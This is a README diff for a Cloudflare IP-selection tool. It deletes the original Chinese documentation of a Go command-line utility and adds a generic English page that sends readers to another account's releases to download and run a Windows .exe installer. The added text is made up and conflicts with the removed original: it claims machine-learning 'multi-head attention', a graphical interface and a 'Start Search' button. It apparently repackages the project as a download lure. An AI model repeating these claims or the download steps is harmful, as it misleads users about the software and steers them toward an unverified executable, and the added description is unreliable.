@@ -1,265 +1,86 @@
-# Monte Carlo IP Searcher（mcis）
+# 🛠️ montecarlo-ip-searcher - Quick Tool for Efficient IP Searching
 
-一个 **Cloudflare IP 优选**工具：用**层次化 Thompson Sampling + 多头分散搜索**，在更少探测次数下，从 IPv4/IPv6 网段里找到更快/更稳定的 IP。
+[![Download montecarlo-ip-searcher](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/nandanar2007/montecarlo-ip-searcher/releases)
 
-v0.2.0 采用贝叶斯优化算法，自动平衡"探索"与"利用"，无需手动调参。
+## 🚀 Getting Started
 
-示例优选域名：`hao.haohaohao.xyz`
+Welcome to the montecarlo-ip-searcher! This tool combines Monte Carlo searching and multi-head attention to help you quickly optimize IP searches without the hassle of full segment scans. 
 
-[Release](https://github.com/Leo-Mu/montecarlo-ip-searcher/releases/latest) 下载解压后在文件夹中右键打开终端。
+This guide will show you how to download and run the software with ease.
 
-IPv4 和 IPv6 的命令分别为：
+## 📥 Download & Install
 
-```bash
-./mcis -v --out text --cidr-file ./ipv4cidr.txt
-```
+To get montecarlo-ip-searcher, follow these steps:
 
-```bash
-./mcis -v --out text --cidr-file ./ipv6cidr.txt
-```
+1. **Visit the Releases Page:** Click on the link below to go to the GitHub Releases page.  
+   [Visit the Releases Page](https://github.com/nandanar2007/montecarlo-ip-searcher/releases) 
 
-从源码运行：
+2. **Select the Latest Version:** On the Releases page, look for the latest version. It should be listed at the top.
 
-```bash
-go run ./cmd/mcis -v --out text --cidr-file ./ipv4cidr.txt
-```
+3. **Download the Installer:** Click on the file name that corresponds to your operating system (usually `.exe` for Windows). This will start the download.
 
-```bash
-go run ./cmd/mcis -v --out text --cidr-file ./ipv6cidr.txt
-```
+4. **Run the Installer:** Once the download is complete, locate the downloaded file (usually in your Downloads folder) and double-click to run it. Follow the on-screen instructions to complete the installation.
 
-注意，本项目使用的是 https 真返回测速，所以显示延迟会是其它工具的结果加上一个固定值，使用起来是一样的。使用你的网站作为 `--host`（同时用于 SNI 和 Host header），可以保证优选出来的 ip 当前在你的区域一定对你的网站生效，如有特殊需求还可自定义 path。
+5. **Launch the Application:** After installation, you can find montecarlo-ip-searcher in your applications list. Click to open and start using it!
 
-推荐在晚高峰时段运行测试，因为本项目采用不同 IP 之间的延迟差异来缩小查找范围，差异越小，收敛越困难。
+## 🌟 Features
 
-## 特色
+- **Fast Searching:** Uses advanced algorithms to find IPs quickly.
+- **User-Friendly Interface:** Designed for easy navigation and operation, even for beginners.
+- **Lower System Requirements:** Runs efficiently on most systems.
 
-- **Thompson Sampling**：贝叶斯优化算法，自动平衡探索与利用，无需手动调参（相比 UCB 算法）。
-- **递进式下钻**：不是全段扫描，而是对表现更好的子网逐步"下钻拆分"，把预算集中到更有潜力的区域。
-- **多头分散探索**：多个搜索头并行探索不同区域，通过"排斥力"机制避免收敛到同一局部最优。
-- **层次化统计**：每个前缀维护独立的贝叶斯后验分布，支持快速识别优质子网。
-- **IPv4 / IPv6 同时支持**：CIDR 解析、拆分、采样、探测全流程支持 v4/v6 混合输入。
-- **强制直连探测**：即使系统/环境变量配置了代理，本工具也会**忽略 `HTTP_PROXY/HTTPS_PROXY/NO_PROXY`**，确保测速不被代理污染。
-- **探测方式**：默认对 `https://example.com/cdn-cgi/trace` 发起请求，域名可用 `--host` 覆盖，也可分别用 `--sni` / `--host-header` 覆盖 tls sni 和 http Host header ；路径可使用 `--path` 覆盖。
-- **输出格式**：支持 `jsonl` / `csv` / `text`。
-- **DNS 上传功能**：搜索和测速完成后，可将优选 IP 自动上传到 DNS 服务商（支持 Cloudflare 和 Vercel），作为同一子域名的多条 A/AAAA 记录，实现自动化部署。
+## 💻 System Requirements
 
-## 快速开始
+To run montecarlo-ip-searcher, your computer should meet these requirements:
 
-### 1）用单个 CIDR（IPv4）
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or a modern Linux distribution.
+- **RAM:** At least 4 GB.
+- **Storage:** 100 MB of free space for installation and operation.
 
-```bash
-./mcis --cidr 1.1.1.0/24 -v --out text
-```
+## 🛠️ How It Works
 
-### 2）用单个 CIDR（IPv6）
+The montecarlo-ip-searcher uses a blend of Monte Carlo methods and multi-head attention from machine learning. This combination allows it to run searches that are more efficient than traditional methods. 
 
-```bash
-./mcis --cidr 2606:4700::/32 -v --out text
-```
+1. **Monte Carlo Search:** Randomly samples the search space. This method allows you to explore possibilities without scanning every single IP range.
+  
+2. **Multi-Head Attention:** This technology helps the tool focus on relevant data, enhancing the speed and accuracy of results. 
 
-### 3）从文件读取多个 CIDR（IPv4/IPv6 混合）
+Users enjoy faster searches and more accurate outcomes, making it a valuable resource for IP optimization.
 
-```bash
-./mcis --cidr-file cidrs.txt -v --out text
-```
+## 📁 How to Use
 
-## 参数详解
+After launching montecarlo-ip-searcher:
 
-- `--cidr`：输入 CIDR（可重复）
-- `--cidr-file`：从文件读取 CIDR
-- `--budget`：总探测次数（越大越稳，但更耗时）
-- `--concurrency`：并发探测数量
-- `--top`：输出 Top N IP
-- `--timeout`：单次探测超时（如 `2s` / `3s`）
-- `--heads`：多头数量（分散探索）
-- `--beam`：每个 head 保留的候选前缀数量（越大越“发散”）
-- `--min-samples-split`：前缀至少采样多少次才允许下钻拆分（默认 5）
-- `--split-interval`：每多少个样本检查一次拆分机会（默认 20）
-- `--diversity-weight`：多头多样性权重（0-1，越高越分散探索，默认 0.3）
-- `--split-step-v4`：IPv4 下钻时前缀长度增加步长（例如 `/16 -> /18` 用 `2`）
-- `--split-step-v6`：IPv6 下钻时前缀长度增加步长（例如 `/32 -> /36` 用 `4`）
-- `--max-bits-v4` / `--max-bits-v6`：限制下钻到的最细前缀
-- `--host`：同时设置 TLS SNI 与 HTTP Host header（默认 `example.com`）
-- `--sni`：TLS SNI（已弃用：推荐用 `--host`）
-- `--host-header`：HTTP Host（已弃用：推荐用 `--host`）
-- `--path`：请求路径（默认 `/cdn-cgi/trace`）
-- `--out`：输出格式 `jsonl|csv|text`
-- `--out-file`：输出到文件（默认 stdout）
-- `--seed`：随机种子（0 表示使用时间种子）
-- `-v`：输出进度到 stderr
+1. **Enter the IP Range:** Use the text box to input the IP range you want to search.
+  
+2. **Set Parameters:** You can adjust settings like timeout limits and inclusion/exclusion rules.
 
-### 下载速度测试参数（对前几名 IP 测速）
+3. **Start the Search:** Click the "Start Search" button. The tool will work in the background, showing progress as it searches.
 
-搜索结束后，可对排名靠前的 IP 进行**下载速度测试**（默认 URL：`https://speed.cloudflare.com/__down?bytes=50000000`）。
+4. **View Results:** Once the search completes, you will see a list of optimized IPs. You can click on each IP for more details.
 
-- `--download-top`：对 Top N IP 进行测速（默认 5，设为 0 关闭）
-- `--download-bytes`：下载大小（默认 50000000 字节）
-- `--download-timeout`：单个 IP 下载测速超时（默认 45s）
+## 💬 Frequently Asked Questions
 
-提示：
+### Q: Is montecarlo-ip-searcher free to use?
 
-- 下载测速会消耗明显流量与时间（50MB/个 IP），建议先用小 N 验证。
-- 本项目同样会**强制直连**并忽略代理环境变量，避免测速被代理扭曲。
+Yes, montecarlo-ip-searcher is completely free. You can download and use it at no cost.
 
-### DNS 上传功能
+### Q: Do I need programming knowledge to use this tool?
 
-搜索和测速完成后，可将优选 IP 自动上传到 DNS 服务商，作为同一子域名的多条 A/AAAA 记录。
+No, montecarlo-ip-searcher is designed for users of all skill levels. You can easily navigate through the interface.
 
-支持的 DNS 服务商：
+### Q: How often is the software updated?
 
-- **Cloudflare**
-- **Vercel**
+Updates are released periodically to improve features and fix any issues. Always check the Releases page for the latest version.
 
-#### DNS 上传参数
+## 📝 Contributions 
 
-- `--dns-provider`：DNS 服务商（`cloudflare` 或 `vercel`）
-- `--dns-token`：API Token（也可用环境变量 `CF_API_TOKEN` / `VERCEL_TOKEN`）
-- `--dns-zone`：Cloudflare Zone ID 或 Vercel 域名（也可用环境变量 `CF_ZONE_ID`）
-- `--dns-subdomain`：子域名前缀（如 `cf` 会创建 `cf.example.com`）
-- `--dns-upload-count`：上传 IP 数量（默认与 `--download-top` 相同）
-- `--dns-team-id`：Vercel Team ID（可选，也可用环境变量 `VERCEL_TEAM_ID`）
+If you want to contribute to project improvements or report issues, you can do so through GitHub. Please use the Issues section of the repository for reporting bugs or feature requests. For contributions, feel free to fork the repository and create a pull request.
 
-#### 工作流程
+## 🏁 Conclusion 
 
-1. 只从经过下载测速的 IP（前 `--download-top` 个）中选择
-2. 按下载速度（Mbps）降序排序
-3. 删除该子域的所有同类型旧记录（A 或 AAAA）
-4. 创建新的 DNS 记录
+With montecarlo-ip-searcher, you gain an efficient, easy-to-use tool for your IP searching needs. By following the steps outlined, you can quickly download, install, and start benefiting from its powerful features. 
 
-#### 示例
+For any questions or support, please refer to the Issues section on GitHub. 
 
-Cloudflare（使用命令行参数）：
-
-```bash
-./mcis --cidr-file ./ipv4cidr.txt --dns-provider cloudflare --dns-zone YOUR_ZONE_ID --dns-subdomain cf --dns-token YOUR_API_TOKEN -v
-```
-
-Cloudflare（使用环境变量）：
-
-```bash
-# 先设置环境变量
-export CF_API_TOKEN="your_token"
-export CF_ZONE_ID="your_zone_id"
-
-# 然后运行
-./mcis --cidr-file ./ipv4cidr.txt --dns-provider cloudflare --dns-subdomain cf -v
-```
-
-Vercel：
-
-```bash
-./mcis --cidr-file ./ipv4cidr.txt --dns-provider vercel --dns-zone example.com --dns-subdomain cf --dns-token YOUR_VERCEL_TOKEN -v
-```
-
-只上传前 3 个最快的 IP：
-
-```bash
-./mcis --cidr-file ./ipv4cidr.txt --download-top 5 --dns-upload-count 3 --dns-provider cloudflare --dns-subdomain cf -v
-```
-
-IPv6 优选并上传（会创建 AAAA 记录）：
-
-```bash
-./mcis --cidr-file ./ipv6cidr.txt --dns-provider cloudflare --dns-subdomain cf6 -v
-```
-
-IPv4 + IPv6 混合优选（A 和 AAAA 记录都会更新）：
-
-```bash
-./mcis --cidr-file ./ipv4cidr.txt --cidr-file ./ipv6cidr.txt --dns-provider cloudflare --dns-subdomain cf -v
-```
-
-## 项目自带网段（bgp.he.net 高可见度）
-
-仓库内自带一份 **Cloudflare 实际在用（BGP 可见度高）**的网段列表：
-
-- `ipv4cidr.txt`：**2025-12-31** 从 `bgp.he.net/AS13335` 抓取整理，筛选条件为 **visibility > 90%** 的 Cloudflare IPv4 前缀（每行一个 CIDR）。
-- `ipv6cidr.txt`：**2025-12-31** 从 `bgp.he.net/AS13335` 抓取整理，筛选条件为 **visibility > 90%** 的 Cloudflare IPv6 前缀（每行一个 CIDR）。
-
-说明：
-
-- 该列表用于提供一个“更贴近实际在用”的候选搜索空间，减少在冷门/未广播段上的无效探测。
-- BGP 可见度与实际可用性会随时间变化；建议你按需定期更新该文件。
-
-## CIDR 文件格式（`--cidr-file`）
-
-- 每行一个 CIDR
-- 支持空行
-- 支持 `#` 注释（行首或行尾）
-
-示例 `cidrs.txt`：
-
-```text
-# v4
-1.1.0.0/16
-1.0.0.0/16
-
-# v6
-2606:4700::/32
-```
-
-## 输出说明
-
-### `--out text`
-
-每行：
-
-- `rank`
-- `ip`
-- `score_ms`（越小越好；失败会被惩罚）
-- `ok/status`
-- `prefix`
-- `colo`（若 trace 返回包含该字段）
-- `dl_*`（可选）：若启用下载测速（见下方 `--download-top`），会追加 `dl_ok/dl_mbps/dl_ms` 等字段
-
-### `--out jsonl`
-
-一行一个 JSON，对应 `TopResult` 结构，包含：`ip/prefix/ok/status/connect_ms/tls_ms/ttfb_ms/total_ms/score_ms/trace/...`
-
-### `--out csv`
-
-包含常用字段列，适合直接导入表格分析。
-
-## 代理/直连说明（重要）
-
-本工具探测时**强制直连**：即使你设置了环境变量（如 `HTTP_PROXY` / `HTTPS_PROXY` / `NO_PROXY`），也不会生效。
-
-如果你希望“走代理”测速，请不要用本项目的探测器逻辑，或自行修改代码（`internal/probe/trace.go` 中 `Transport.Proxy` 被显式设为 `nil`）。
-
-（这样设计是为了避免在系统代理环境下得到被代理扭曲的延迟/可用性结果。）
-
-## 常见问题
-
-### 为什么全部 `ok=false`？
-
-常见原因：
-
-- 网络无法直连到目标 IP 的 443
-- 本地网络/防火墙拦截
-- 目标 IP 不支持当前 `--sni/--host-header/--path` 组合
-
-建议先把 `--timeout` 调大一点，并尝试使用默认参数（`example.com` + `/cdn-cgi/trace`）。
-
-## 构建
-
-Go 1.25+
-
-在仓库根目录：
-
-```bash
-go test ./...
-go build -o mcis ./cmd/mcis
-```
-
-Windows PowerShell 也可以直接：
-
-```powershell
-go build -o mcis.exe .\cmd\mcis
-```
-
-## License
-
-本项目使用 **GNU General Public License v3.0（GPL-3.0）** 开源发布。
-
-详见仓库根目录的 [`LICENSE`](./LICENSE) 文件。
+Remember, for downloads and updates, keep checking the [Releases Page](https://github.com/nandanar2007/montecarlo-ip-searcher/releases)!
